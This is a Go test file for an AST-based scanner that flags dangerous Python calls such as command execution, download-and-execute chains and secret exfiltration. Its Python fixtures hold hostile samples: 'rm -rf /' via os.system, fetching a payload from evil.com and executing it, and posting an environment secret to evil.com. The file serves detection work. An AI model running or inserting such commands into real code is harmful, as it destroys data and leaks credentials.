package ir

import (
	"fmt"
	"testing"
)

func TestCallPatternMatching(t *testing.T) {
	code := `import os
import requests

def exfiltrate(url):
    token = os.getenv("API_KEY")
    requests.post(url, json={"token": token})

def dangerous():
    os.system("rm -rf /")
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("test.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	// 测试单个调用模式
	pattern := NewCallPattern("os.system", "检测到命令执行")
	matcher := NewPatternMatcher([]Pattern{pattern})
	findings := matcher.MatchFile(*file)

	if len(findings) == 0 {
		t.Fatal("should match os.system call")
	}
	fmt.Printf("Matched os.system: %d findings\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - %s at %s\n", f.Description, f.Location)
	}
}

func TestCategoryPatternMatching(t *testing.T) {
	code := `import os
import requests

def exfiltrate(url):
    token = os.getenv("API_KEY")
    requests.post(url, json={"token": token})

def dangerous():
    os.system("rm -rf /")
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("test.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	// 测试按类别匹配
	pattern := NewCallCategoryPattern("command_exec", "检测到命令执行类调用")
	matcher := NewPatternMatcher([]Pattern{pattern})
	findings := matcher.MatchFile(*file)

	if len(findings) == 0 {
		t.Fatal("should match command_exec category")
	}
	fmt.Printf("Matched command_exec: %d findings\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - %s at %s\n", f.Description, f.Location)
	}
}

func TestCallChainPattern(t *testing.T) {
	code := `import os
import requests

def attack():
    data = requests.get("https://evil.com/payload")
    os.system(data)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("test.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	// 测试调用链模式：requests.get → os.system
	pattern := NewCallChainPattern("requests.get", "os.system", "下载后执行")
	matcher := NewPatternMatcher([]Pattern{pattern})
	findings := matcher.MatchFile(*file)

	if len(findings) == 0 {
		t.Fatal("should match call chain: requests.get → os.system")
	}
	fmt.Printf("Matched call chain: %d findings\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - %s at %s\n", f.Description, f.Location)
		if len(f.DataFlow) > 0 {
			fmt.Printf("    DataFlow: ")
			for _, step := range f.DataFlow {
				fmt.Printf("%s(%s) → ", step.Kind, step.Description)
			}
			fmt.Println()
		}
	}
}

func TestDataFlowPattern(t *testing.T) {
	code := `import os
import requests

def exfiltrate():
    secret = os.getenv("SECRET_KEY")
    requests.post("https://evil.com", data=secret)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("test.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	// 测试数据流模式：os.getenv → requests.post
	pattern := NewDataFlowPattern("os.getenv", "requests.post", "环境变量外发")
	matcher := NewPatternMatcher([]Pattern{pattern})
	findings := matcher.MatchFile(*file)

	fmt.Printf("DataFlow findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - %s at %s\n", f.Description, f.Location)
		fmt.Printf("    Category: %s\n", f.Category)
	}
}

func TestDangerousCallPatterns(t *testing.T) {
	code := `import os
import subprocess

def run(cmd):
    os.system(cmd)
    subprocess.call(cmd, shell=True)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("test.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	patterns := DangerousCallPatterns()
	matcher := NewPatternMatcher(patterns)
	findings := matcher.MatchFile(*file)

	fmt.Printf("Dangerous call findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - [%s] %s at %s\n", f.Category, f.Description, f.Location)
	}

	if len(findings) < 2 {
		t.Errorf("expected at least 2 dangerous call findings, got %d", len(findings))
	}
}

func TestMultiFileMatching(t *testing.T) {
	files := []File{
		{
			Path:     "a.py",
			Language: "python",
			Functions: []Function{
				{
					Name: "exfiltrate",
					Calls: []CallExpr{
						{FuncName: "os.getenv", Line: 3},
						{FuncName: "requests.post", Line: 4},
					},
				},
			},
		},
		{
			Path:     "b.py",
			Language: "python",
			Functions: []Function{
				{
					Name: "dangerous",
					Calls: []CallExpr{
						{FuncName: "os.system", Line: 3},
					},
				},
			},
		},
	}

	patterns := DangerousCallPatterns()
	matcher := NewPatternMatcher(patterns)
	findings := matcher.MatchFiles(files)

	fmt.Printf("Multi-file findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - [%s] %s at %s\n", f.Category, f.Description, f.Location)
	}
}

func TestPatternWithNegate(t *testing.T) {
	code := `import os

def safe():
    print("hello")

def dangerous():
    os.system("rm -rf /")
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("test.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	// 匹配非 os.system 的调用
	pattern := Pattern{
		Kind: PatternCall,
		Rules: []MatchRule{
			{Field: "func_name", Op: OpContains, Value: "os.system", Negate: true},
		},
		Description: "非 os.system 调用",
	}
	matcher := NewPatternMatcher([]Pattern{pattern})
	findings := matcher.MatchFile(*file)

	fmt.Printf("Non-os.system findings: %d\n", len(findings))
	for _, f := range findings {
		fmt.Printf("  - %s at %s\n", f.Description, f.Location)
	}
}

func TestPatternVsRegex(t *testing.T) {
	// 对比：正则可能误报的场景
	code := `def example():
    # 这是一个注释: os.system("not a real call")
    result = calculate_score()
    return result
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("test.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	// AST 模式匹配：只匹配真正的调用，不匹配注释中的文本
	pattern := NewCallPattern("os.system", "检测到命令执行")
	matcher := NewPatternMatcher([]Pattern{pattern})
	findings := matcher.MatchFile(*file)

	// 应该没有匹配（注释中的 os.system 不是真正的调用）
	if len(findings) > 0 {
		t.Errorf("AST pattern should not match comments, got %d findings", len(findings))
	}
	fmt.Printf("Comment filtering works: %d findings (expected 0)\n", len(findings))
}
